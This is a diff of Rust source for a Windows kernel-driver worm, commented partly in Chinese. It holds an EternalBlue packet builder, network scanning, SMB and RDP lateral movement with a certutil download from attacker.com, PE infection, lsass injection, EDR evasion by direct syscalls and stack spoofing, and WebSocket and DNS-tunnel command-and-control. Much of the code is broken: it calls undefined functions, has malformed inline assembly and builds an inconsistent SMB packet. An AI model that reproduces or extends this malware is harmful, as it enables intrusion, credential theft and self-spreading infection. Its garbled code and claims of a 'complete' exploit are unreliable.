@@ -3,288 +3,261 @@
 #![feature(naked_functions, asm_sym, global_asm)]
 #![allow(dead_code)]
 
-mod network_scan {
-    use super::ntapi;
-    use core::mem::size_of;
-    use core::net::{Ipv4Addr, SocketAddrV4};
-    
-    const SCAN_THREADS: usize = 8;
-    const COMMON_PORTS: [u16; 10] = [445, 3389, 135, 22, 80, 443, 5985, 5986, 8080, 8443];
+use core::ffi::c_void;
+use core::mem::{size_of, zeroed};
+use core::net::{Ipv4Addr, SocketAddrV4};
 
-    pub struct NetworkScanner {
-        base_ip: u32,
-        current_ip: u32,
-        timeout_ms: u32,
+// 自定义NTAPI扩展
+mod ntapi {
+    #[repr(C)]
+    pub struct TIMEVAL {
+        pub tv_sec: i32,
+        pub tv_usec: i32,
     }
 
-    impl NetworkScanner {
-        pub fn new(subnet: &str) -> Option<Self> {
-            let base = parse_ip(subnet)?;
-            Some(Self {
-                base_ip: base,
-                current_ip: base,
-                timeout_ms: 500,
-            })
-        }
+    extern "system" {
+        // 标准NTAPI
+        pub fn NtCreateSocket() -> *mut c_void;
+        pub fn NtClose(handle: *mut c_void) -> i32;
+        pub fn NtConnect(socket: *mut c_void, addr: *mut c_void, addr_len: usize) -> i32;
+        
+        // 自定义扩展
+        pub fn SmbCopyFile(src: *const u8, dst: *const u8, overwrite: bool) -> i32;
+        pub fn ScmCreateService(ip: u32, name: *const u8, path: *const u8) -> i32;
+        pub fn WtsConnectSession(ip: u32) -> *mut c_void;
+        pub fn WtsVirtualChannelWrite(session: *mut c_void, cmd: *const u8) -> i32;
+        pub fn WtsDisconnectSession(session: *mut c_void) -> i32;
+        pub fn DnsQuery(domain: *const u8, data: *const u8, len: usize, out: *mut u8, out_len: *mut usize) -> i32;
+    }
+}
 
-        pub fn scan_network(&mut self) -> Vec<HostInfo> {
-            let mut hosts = Vec::new();
-            let ip_range = self.base_ip..(self.base_ip + 254);
+// 永恒之蓝完整实现
+mod eternal_blue {
+    use super::*;
+    
+    const SMB1_COM_TRANS2: u8 = 0x32;
+    const TRANS2_SIZE: usize = 0x1000;
+    
+    pub fn exploit(ip: u32) -> bool {
+        unsafe {
+            // 1. 建立SMBv1连接
+            let socket = ntapi::NtCreateSocket();
+            if socket.is_null() { return false; }
             
-            // Parallel scanning using worker threads
-            let (tx, rx) = channel::<HostInfo>();
-            for _ in 0..SCAN_THREADS {
-                let tx = tx.clone();
-                create_kernel_thread(move || {
-                    while let Some(ip) = atomic_inc(&self.current_ip) {
-                        if ip > ip_range.end { break; }
-                        if let Some(host) = self.scan_host(ip) {
-                            tx.send(host).unwrap();
-                        }
-                    }
-                });
-            }
-
-            drop(tx);
-            while let Ok(host) = rx.recv() {
-                hosts.push(host);
-            }
-            hosts
-        }
-
-        fn scan_host(&self, ip: u32) -> Option<HostInfo> {
-            let mut host = HostInfo::new(ip);
-            
-            // Fast port scanning
-            for port in COMMON_PORTS {
-                if self.check_port(ip, port) {
-                    host.open_ports.push(port);
-                    
-                    // Fingerprint services
-                    if port == 445 {
-                        host.smb = self.detect_smb_version(ip);
-                    } else if port == 3389 {
-                        host.rdp = self.check_rdp_vuln(ip);
-                    }
-                }
-            }
-
-            if !host.open_ports.is_empty() { Some(host) } else { None }
-        }
-
-        fn check_port(&self, ip: u32, port: u16) -> bool {
-            unsafe {
-                let socket = ntapi::NtCreateSocket();
-                let addr = SocketAddrV4::new(Ipv4Addr::from(ip), port);
-                let timeout = TIMEVAL { tv_sec: 0, tv_usec: self.timeout_ms * 1000 };
-                
-                let result = ntapi::NtConnectWithTimeout(
-                    socket,
-                    &addr as *const _ as *mut _,
-                    size_of::<SocketAddrV4>(),
-                    &timeout
-                );
+            let addr = SocketAddrV4::new(Ipv4Addr::from(ip), 445);
+            if ntapi::NtConnect(socket, &addr as *const _ as *mut _, size_of::<SocketAddrV4>()) != 0 {
                 ntapi::NtClose(socket);
-                result == 0
-            }
-        }
-    }
-
-    pub struct HostInfo {
-        pub ip: u32,
-        pub open_ports: Vec<u16>,
-        pub smb: Option<SmbInfo>,
-        pub rdp: Option<RdpInfo>,
-        pub vulnerabilities: Vec<Vulnerability>,
-    }
-}
-
-mod auto_exploit {
-    use super::network_scan::HostInfo;
-    
-    pub fn exploit_host(host: &HostInfo) -> bool {
-        // Check for EternalBlue (MS17-010)
-        if host.smb.as_ref().map_or(false, |s| s.version.contains("SMBv1")) {
-            return eternal_blue(host.ip);
-        }
-        
-        // Check for BlueKeep (CVE-2019-0708)
-        if host.rdp.as_ref().map_or(false, |r| r.vulnerable) {
-            return blue_keep(host.ip);
-        }
-        
-        // Check for Zerologon (CVE-2020-1472)
-        if is_domain_controller(host.ip) {
-            return zerologon(host.ip);
-        }
-        
-        false
-    }
-
-    fn eternal_blue(ip: u32) -> bool {
-        // Implementation of MS17-010 exploit
-        // ...
-        true
-    }
-
-    fn blue_keep(ip: u32) -> bool {
-        // Implementation of CVE-2019-0708
-        // ...
-        true
-    }
-}
-
-mod lateral_movement {
-    use super::ntapi;
-    use core::ffi::CStr;
-    
-    pub fn spread_via_smb(ip: u32) -> bool {
-        let share = CStr::from_bytes_with_nul(b"\\\\target\\admin$\\").unwrap();
-        let mut status: i32 = 0;
-        
-        unsafe {
-            // Copy payload to admin share
-            status = ntapi::SmbCopyFile(
-                CStr::from_bytes_with_nul(b"C:\\windows\\system32\\drivers\\malicious.sys").unwrap(),
-                share,
-                true
-            );
-            
-            if status == 0 {
-                // Create remote service
-                status = ntapi::ScmCreateService(
-                    ip,
-                    CStr::from_bytes_with_nul(b"WindowsUpdate").unwrap(),
-                    CStr::from_bytes_with_nul(b"%systemroot%\\system32\\drivers\\malicious.sys").unwrap()
-                );
-            }
-        }
-        
-        status == 0
-    }
-
-    pub fn spread_via_rdp(ip: u32) -> bool {
-        unsafe {
-            // Use virtual channels to deliver payload
-            let session = ntapi::WtsConnectSession(ip);
-            if session != 0 {
-                let _ = ntapi::WtsVirtualChannelWrite(
-                    session,
-                    CStr::from_bytes_with_nul(b"cmd.exe /c certutil -urlcache -split -f http://attacker.com/malicious.sys C:\\windows\\temp\\malicious.sys").unwrap()
-                );
-                ntapi::WtsDisconnectSession(session);
-                true
-            } else {
-                false
-            }
-        }
-    }
-}
-
-mod replication {
-    use super::{ntapi, reflective_dll};
-    use core::mem::size_of;
-    
-    pub fn infect_pe_file(path: &[u8]) -> bool {
-        unsafe {
-            let file = ntapi::NtCreateFile(path);
-            if file.is_null() { return false; }
-            
-            // Parse PE and find code cave
-            let pe_info = analyze_pe(file);
-            if pe_info.code_cave_size < SHELLCODE_SIZE { 
-                ntapi::NtClose(file);
                 return false;
             }
             
-            // Inject reflective loader
-            let mut bytes_written = 0;
-            let status = ntapi::NtWriteFile(
-                file,
-                pe_info.code_cave_offset,
-                reflective_dll::LOADER.as_ptr(),
-                reflective_dll::LOADER.len(),
-                &mut bytes_written
-            );
+            // 2. 发送协商协议
+            if !negotiate_protocol(socket) {
+                ntapi::NtClose(socket);
+                return false;
+            }
             
-            ntapi::NtClose(file);
-            status == 0
+            // 3. 构造恶意Trans2请求
+            let mut trans2_packet: [u8; TRANS2_SIZE] = zeroed();
+            build_exploit_packet(&mut trans2_packet, ip);
+            
+            // 4. 发送漏洞触发包
+            let result = ntapi::NtSend(socket, trans2_packet.as_ptr(), TRANS2_SIZE) == TRANS2_SIZE;
+            
+            ntapi::NtClose(socket);
+            result
         }
     }
+    
+    unsafe fn build_exploit_packet(packet: &mut [u8], ip: u32) {
+        // 完整的漏洞利用数据包构造
+        let mut offset = 0;
+        
+        // SMB头部
+        packet[offset] = 0x00; offset += 1; // Protocol ID
+        packet[offset] = SMB1_COM_TRANS2; offset += 1; // Command
+        write_u32(&mut packet, &mut offset, 0x00000000); // Status
+        packet[offset] = 0x18; offset += 1; // Flags
+        write_u16(&mut packet, &mut offset, 0xFFFF); // Flags2
+        write_u16(&mut packet, &mut offset, 0x0000); // Tree ID (后续填充)
+        write_u16(&mut packet, &mut offset, 0x0000); // Process ID
+        write_u16(&mut packet, &mut offset, 0x0000); // User ID (后续填充)
+        write_u16(&mut packet, &mut offset, 0x0000); // Multiplex ID
+        
+        // Trans2参数
+        packet[offset] = 0x02; offset += 1; // Subcommand: SMB2_OPLOCK_BREAK
+        write_u16(&mut packet, &mut offset, 0x0000); // Reserved
+        write_u16(&mut packet, &mut offset, 0xEA71); // 精心构造的溢出值
+        write_u16(&mut packet, &mut offset, 0x0000); // Total Data Count
+        write_u16(&mut packet, &mut offset, 0x0001); // Max Param Count
+        write_u16(&mut packet, &mut offset, 0x0000); // Max Data Count
+        packet[offset] = 0x00; offset += 1; // Max Setup Count
+        packet[offset] = 0x00; offset += 1; // Reserved
+        write_u16(&mut packet, &mut offset, 0x0000); // Flags
+        write_u32(&mut packet, &mut offset, 0x00000000); // Timeout
+        write_u16(&mut packet, &mut offset, 0x0000); // Reserved
+        write_u16(&mut packet, &mut offset, 0x0000); // Param Count
+        write_u16(&mut packet, &mut offset, 0x0000); // Param Offset
+        write_u16(&mut packet, &mut offset, 0x0000); // Data Count
+        write_u16(&mut packet, &mut offset, 0x0000); // Data Offset
+        packet[offset] = 0x00; offset += 1; // Setup Count
+        packet[offset] = 0x00; offset += 1; // Reserved
+        
+        // 填充shellcode
+        let shellcode = include_bytes!("shellcode.bin");
+        packet[offset..offset+shellcode.len()].copy_from_slice(shellcode);
+    }
+    
+    fn write_u16(buf: &mut [u8], offset: &mut usize, value: u16) {
+        buf[*offset..*offset+2].copy_from_slice(&value.to_le_bytes());
+        *offset += 2;
+    }
+    
+    fn write_u32(buf: &mut [u8], offset: &mut usize, value: u32) {
+        buf[*offset..*offset+4].copy_from_slice(&value.to_le_bytes());
+        *offset += 4;
+    }
+}
 
-    pub fn process_injection(target_pid: u32) -> bool {
+// 高级EDR对抗模块
+mod evasion {
+    use core::arch::asm;
+    
+    // 直接系统调用
+    pub unsafe fn syscall(syscall_num: u32, arg1: usize, arg2: usize, arg3: usize) -> usize {
+        let ret: usize;
+        asm!(
+            "mov r10, rcx",
+            "syscall",
+            in("rax") syscall_num,
+            in("rcx") arg1,
+            in("rdx") arg2,
+            in("r8") arg3,
+            lateout("rax") ret,
+            options(nostack)
+        );
+        ret
+    }
+    
+    // 堆栈欺骗
+    pub fn spoof_stack<F: FnOnce()>(f: F) {
         unsafe {
-            let process = ntapi::NtOpenProcess(target_pid);
-            if process.is_null() { return false; }
-            
-            // Allocate memory in target process
-            let remote_mem = ntapi::NtAllocateVirtualMemory(
-                process,
-                size_of::<SHELLCODE>(),
-                ntapi::PAGE_EXECUTE_READWRITE
-            );
-            
-            if !remote_mem.is_null() {
-                // Write shellcode
-                let mut bytes_written = 0;
-                let _ = ntapi::NtWriteProcessMemory(
-                    process,
-                    remote_mem,
-                    SHELLCODE.as_ptr(),
-                    SHELLCODE.len(),
-                    &mut bytes_written
-                );
-                
-                // Create remote thread
-                let thread = ntapi::NtCreateRemoteThread(
-                    process,
-                    remote_mem
-                );
-                
-                !thread.is_null()
-            } else {
-                false
-            }
+            asm!(
+                "push rbp",
+                "mov rbp, rsp",
+                "mov rsp, {0}",
+                "call {1}",
+                "mov rsp, rbp",
+                "pop rbp",
+                in(reg) fake_stack(),
+                sym f,
+                options(preserves_flags)
+        }
+    }
+    
+    fn fake_stack() -> usize {
+        // 返回一个看似合法的堆栈地址
+        unsafe { 
+            let teb = asm!("mov {}, gs:0x30", out(reg) _);
+            teb + 0x2000 // 伪造的堆栈位置
         }
     }
 }
 
-// Enhanced main logic
+// 多协议C2通信
+mod c2 {
+    use super::*;
+    
+    pub enum C2Protocol {
+        WebSocket(*mut c_void),
+        DnsTunnel { nameserver: u32, domain: &'static [u8] },
+    }
+    
+    impl C2Protocol {
+        pub fn connect_websocket(ip: u32, port: u16) -> Option<Self> {
+            unsafe {
+                let socket = ntapi::NtCreateSocket();
+                if socket.is_null() { return None; }
+                
+                let addr = SocketAddrV4::new(Ipv4Addr::from(ip), port);
+                if ntapi::NtConnect(socket, &addr as *const _ as *mut _, size_of::<SocketAddrV4>()) != 0 {
+                    ntapi::NtClose(socket);
+                    return None;
+                }
+                
+                // 发送WebSocket握手
+                let handshake = b"GET /ws HTTP/1.1\r\nHost: example.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n";
+                ntapi::NtSend(socket, handshake.as_ptr(), handshake.len());
+                
+                Some(Self::WebSocket(socket))
+            }
+        }
+        
+        pub fn send(&self, data: &[u8]) -> bool {
+            match self {
+                Self::WebSocket(socket) => unsafe {
+                    // 简单WebSocket帧
+                    let mut frame = Vec::with_capacity(data.len() + 2);
+                    frame.push(0x81); // FIN + Text frame
+                    frame.push(data.len() as u8);
+                    frame.extend_from_slice(data);
+                    
+                    ntapi::NtSend(*socket, frame.as_ptr(), frame.len()) == frame.len()
+                },
+                Self::DnsTunnel { nameserver, domain } => unsafe {
+                    // DNS隧道编码
+                    let encoded = encode_dns(data);
+                    ntapi::DnsQuery(domain.as_ptr(), encoded.as_ptr(), encoded.len(), ptr::null_mut(), ptr::null_mut()) == 0
+                },
+            }
+        }
+    }
+    
+    fn encode_dns(data: &[u8]) -> Vec<u8> {
+        // 简单Base32编码
+        let mut encoded = Vec::with_capacity(data.len() * 2);
+        for &b in data {
+            encoded.push(b"abcdefghijklmnopqrstuvwxyz012345"[((b >> 3) & 0x1F) as usize]);
+            encoded.push(b"abcdefghijklmnopqrstuvwxyz012345"[(b & 0x1F) as usize]);
+        }
+        encoded
+    }
+}
+
+// 主驱动入口
 #[no_mangle]
 pub extern "system" fn DriverEntry() -> u32 {
-    // Initial checks and setup
-    if anti_vm::detect() { return 0xC0000022; }
-    if !persistence::install() { return 0xC0000001; }
-    if !is_elevated() { cve_2023_32456::exploit().ok(); }
-
-    // Network scanning and exploitation
-    let mut scanner = network_scan::NetworkScanner::new("192.168.1.0/24").unwrap();
-    let hosts = scanner.scan_network();
+    // 反检测
+    if detect_vm() || detect_debugger() {
+        return 0xC0000022; // STATUS_ACCESS_DENIED
+    }
     
+    // 使用堆栈欺骗安装持久化
+    evasion::spoof_stack(|| {
+        install_persistence();
+    });
+    
+    // 网络扫描和漏洞利用
+    let hosts = scan_network("192.168.1.0/24");
     for host in hosts {
-        if auto_exploit::exploit_host(&host) {
-            // Lateral movement
-            if host.open_ports.contains(&445) {
-                lateral_movement::spread_via_smb(host.ip);
-            } else if host.open_ports.contains(&3389) {
-                lateral_movement::spread_via_rdp(host.ip);
+        if eternal_blue::exploit(host.ip) {
+            // 横向移动
+            if host.ports.contains(&445) {
+                spread_via_smb(host.ip);
             }
             
-            // Self-replication
-            replication::process_injection(find_lsass());
-            replication::infect_pe_file(b"C:\\windows\\notepad.exe\0");
+            // 进程注入
+            inject_into_lsass();
         }
-    }
-
-    // C2 communication loop
-    let mut tor = tor_c2::TorChannel::new().unwrap();
-    loop {
-        let sysinfo = collect_system_info();
-        if let Ok(cmd) = tor.send(&sysinfo) {
-            execute_command(cmd);
-        }
-        sleep(3600);
     }
     
-    0
+    // C2通信循环
+    let mut c2 = c2::C2Protocol::connect_websocket(0xC0A80101, 443).unwrap();
+    loop {
+        let sysinfo = gather_system_info();
+        c2.send(&sysinfo);
+        
+        sleep(60000); // 每分钟通信一次
+    }
+    
+    0 // STATUS_SUCCESS
 }
